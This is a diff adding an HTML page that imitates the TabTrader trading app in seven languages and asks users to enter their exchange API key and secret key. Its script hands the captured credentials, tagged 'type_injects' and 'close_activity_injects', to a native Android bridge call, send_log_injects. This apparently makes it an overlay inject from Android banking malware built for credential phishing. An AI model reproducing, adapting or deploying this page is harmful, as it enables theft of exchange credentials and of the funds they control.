@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en" ng-app="app">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>    
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"></title>
+    <style>
+        body {
+            background-color: #242529;
+        }
+
+        .cool-input {
+            box-sizing: border-box;
+            border: 0;
+            width: 100%;
+            position: relative;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .cool-input__input {
+            box-sizing: border-box;
+            background: none;
+            width: 100%;
+            padding: 10px;
+            padding-left: 0;
+            position: relative;
+            z-index: 2;
+            font-size: 1em;
+        }
+        .cool-input__input:focus {
+            outline: none;
+        }
+
+        .cool-input__placeholder {
+            box-sizing: border-box;
+            border: none;
+            background: none;
+            width: auto;
+            position: absolute;
+            z-index: 1;
+            left: 15px;
+            top: 50%;
+            line-height: 1em;
+            color: #77787a;
+            transition: all 0.2s ease;
+            font-weight: 600;
+            background-color: #242529;
+        }
+
+        .cool-input__input_filled + .cool-input__placeholder, .cool-input__input:focus + .cool-input__placeholder {
+            font-size: 0.8em;
+            top: 0;
+            margin-top: 0.3em;
+            background: #242529;
+            padding: 5px 6px;
+            z-index: 99;
+            width: auto;
+            left: 8px;
+        }
+
+        .cool-input__input:focus + .cool-input__placeholder {
+            color: #66abaf;
+        }
+
+        .input {
+            border: 2px solid #77787a;
+            border-radius: 4px;
+            margin-top: 15px;
+            padding-left: 15px;
+            color: #fff;
+            transition: all 0.2s ease;
+        }
+
+        .input:focus {
+            border-color: #66abaf;
+        }
+
+        .errorPCH {
+            color: #ff7043 !important;
+        }
+
+        .error {
+            border-color: #ff7043 !important;
+        }
+
+        section {
+            padding: 20px;
+        }
+
+        .button {
+            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAbBAMAAAAE3iuqAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RjUzNTFFNDZBNUE5MTFFQThCRDY4REMwRTg3NDgxNUYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RjUzNTFFNDdBNUE5MTFFQThCRDY4REMwRTg3NDgxNUYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpGNTM1MUU0NEE1QTkxMUVBOEJENjhEQzBFODc0ODE1RiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpGNTM1MUU0NUE1QTkxMUVBOEJENjhEQzBFODc0ODE1RiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PpsFLcMAAAAhUExURSQlKTEyNlJTVoqLjZCRk5eYmcLCw8/P0PHx8v7+/v///1VJNREAAABrSURBVCjPY2BABUwODOhAYym6CFPXqgB0RatWGmAomjx4FTEmYSgSX6GAblLVqiZ0kyxXgZUhW8c8C6wMxTqwMlQ3gZWhuQmoTAnN4UBlHegOt1y1Ct13QGXovgMqQw8CBuaZBhgRaozMAQCbIjfWed1eQQAAAABJRU5ErkJggg==');
+            background-size: 18px;
+            background-color: transparent;
+            background-repeat: no-repeat;
+            background-position: center center;
+            border: 0;
+            height: 24px;
+            width: 24px;
+            float: right;
+            position: relative;
+            top: -4.5vh;
+            right: 1vh;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+    </style>
+</head>
+<body ng-controller="c1">
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABDgAAABbCAMAAACh4cVaAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RTY4RUUwRkJBNUI1MTFFQUEyQzI4M0E5QzMyRDEyN0EiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RTY4RUUwRkNBNUI1MTFFQUEyQzI4M0E5QzMyRDEyN0EiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpFNjhFRTBGOUE1QjUxMUVBQTJDMjgzQTlDMzJEMTI3QSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpFNjhFRTBGQUE1QjUxMUVBQTJDMjgzQTlDMzJEMTI3QSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Prf+MLcAAAJnUExURSQlKSgpLSss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">
+            <input type="submit" class="button" id="sendData" value="">
+        </header>
+        <section>
+            <div class="cool-input">
+                <input type="text" id="name" name="name" class="input cool-input__input" required>
+                <span class="cool-input__placeholder" id="namePCH">{{t.__text1}}</span>
+            </div>
+
+            <p style="color: #bebebf;">{{t.__text2}}</p>
+            <p style="color: #bebebf;">{{t.__text3}} <u style="color: #66abaf;">{{t.__text4}}</u></p>
+            
+            <div class="cool-input">
+                <input type="text" id="api" name="api" class="input cool-input__input" required>
+                <span class="cool-input__placeholder" id="keyPCH">{{t.__text5}}</span>
+            </div>
+            <div class="cool-input">
+                <input type="text" id="secret" name="secret" class="input cool-input__input" required>
+                <span class="cool-input__placeholder" id="secretPCH">{{t.__text6}}</span>
+            </div>
+
+            <p style="color: #bebebf;">{{t.__text7}}</p>
+        </section>
+    </form>
+    <script>
+        $('.cool-input__input').on('input', function(){
+            var $this = $(this);
+            if ($this.val() == '') {
+                $this.removeClass('cool-input__input_filled');
+            } else {
+                $this.addClass('cool-input__input_filled');
+            }
+        });
+
+        var appName = document.getElementById('name'),
+            api = document.getElementById('api'),
+            secret = document.getElementById('secret'),
+            sendData = document.getElementById('sendData'),
+            namePCH = document.getElementById('namePCH'),
+            keyPCH = document.getElementById('keyPCH');
+
+        sendData.onclick = () => {
+            if(appName.value.length == 0) {
+                appName.classList.add('error');
+                namePCH.classList.add('errorPCH');
+            } else {
+                appName.classList.remove('error');
+                namePCH.classList.remove('errorPCH');
+            }
+
+            if(api.value.length == 0) {
+                api.classList.add('error');
+                keyPCH.classList.add('errorPCH');
+            } else {
+                api.classList.remove('error');
+                keyPCH.classList.remove('errorPCH');
+            }
+
+            if(secret.value.length == 0) {
+                secret.classList.add('error');
+                secretPCH.classList.add('errorPCH');
+            } else {
+                secret.classList.remove('error');
+                secretPCH.classList.remove('errorPCH');
+            }
+
+            if(appName.value.length != 0 && api.value.length != 0 && secret.value.length != 0) {
+                var data = {};
+                data.appName = appName.value;
+                data.apiKey = api.value;
+                data.secretKey = secret.value;
+                data.type_injects = "crypt";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+            }
+        }
+    </script>
+    <script>
+        var text, 
+            link = "facebook.com", 
+            appname = "Facebook", 
+            texts = { 
+        
+                en: { 
+                    __text1: "Name",
+                    __text2: "Fill in the fields below using data from the Profile or Settings page on the exchange website",
+                    __text3: "If you do not have account, you can",
+                    __text4: "register",
+                    __text5: "Api key",
+                    __text6: "Secret key",
+                    __text7: "Important: create new API key and don't use it outside of TabTrader app",
+                }, 
+        
+                tr: { 
+                    __text1: "Ad",
+                    __text2: "Exchange web sitesindeki profil veya ayarlar sayfasındaki verileri kullanarak aşağıdaki alanları doldurun",
+                    __text3: "Hesabınız yoksa, şunları yapabilirsiniz",
+                    __text4: "yaptırmak",
+                    __text5: "Apı anahtarı",
+                    __text6: "Gizli anahtar",
+                    __text7: "Önemli: yeni API anahtarı oluşturun ve TabTrader uygulaması dışında kullanmayın",
+                }, 
+                
+                es: { 
+                    __text1: "Nombre",
+                    __text2: "Rellene los siguientes campos utilizando los datos de la página Perfil o Configuración en el sitio web de intercambio",
+                    __text3: "Si no tiene cuenta, puede",
+                    __text4: "registrar",
+                    __text5: "Clave Api",
+                    __text6: "Clave secreta",
+                    __text7: "Importante: cree una nueva clave API y no la use fuera de la aplicación TabTrader",
+                },  
+        
+                fr: { 
+                    __text1: "Nom",
+                    __text2: "Remplissez les champs ci-dessous en utilisant les données de la page Profil ou paramètres sur le site Web exchange",
+                    __text3: "Si vous n'avez pas de compte, vous pouvez",
+                    __text4: "inscrire",
+                    __text5: "Clé Api",
+                    __text6: "Clé secrète",
+                    __text7: "Important: créez une nouvelle clé API et ne l'utilisez pas en dehors de L'application TabTrader",
+                }, 
+        
+                ro: { 
+                    __text1: "Nume",
+                    __text2: "Completați câmpurile de mai jos utilizând datele din pagina Profil sau Setări de pe site-ul de schimb",
+                    __text3: "Dacă nu aveți cont, puteți",
+                    __text4: "înregistrare",
+                    __text5: "Tasta Api",
+                    __text6: "Cheie secretă",
+                    __text7: "Important: creați o nouă cheie API și nu o utilizați în afara aplicației TabTrader",
+                }, 
+        
+                it: { 
+                    __text1: "Nome",
+                    __text2: "Compila i campi sottostanti utilizzando i dati della pagina Profilo o impostazioni sul sito Web di exchange",
+                    __text3: "Se non si dispone di account, è possibile",
+                    __text4: "registrare",
+                    __text5: "Chiave Api",
+                    __text6: "Chiave segreta",
+                    __text7: "Importante: creare una nuova chiave API e non utilizzarla al di fuori Dell'app TabTrader",
+                },  
+        
+                de: { 
+                    __text1: "Name",
+                    __text2: "Füllen Sie die Felder unten mit Daten von der Profil-oder Einstellungsseite auf der exchange-website aus",
+                    __text3: "Wenn Sie kein Konto haben, können Sie",
+                    __text4: "registrieren",
+                    __text5: "Api-key",
+                    __text6: "Geheimschlüssel",
+                    __text7: "Wichtig: erstellen Sie einen neuen API-Schlüssel und verwenden Sie ihn nicht außerhalb der TabTrader app",
+                }, 
+            }
+
+            var language = window.navigator.userLanguage || window.navigator.language; 
+            language = language.match(/^.{2}/), texts[language] == undefined ? text = texts.en : text = texts[language]; 
+
+            var app = angular.module("app", []); 
+            app.controller("c1", ["$scope", "$rootScope", function (t, e) { 
+                rootScope = e, 
+                scope = t, 
+                e.scums = [], 
+                t.t = text, 
+                t.reset = function () { 
+                    $(e.scums).each(function () { 
+                        this.reset() }) 
+                } 
+            }]);
+        </script>
+</body>
+</html>
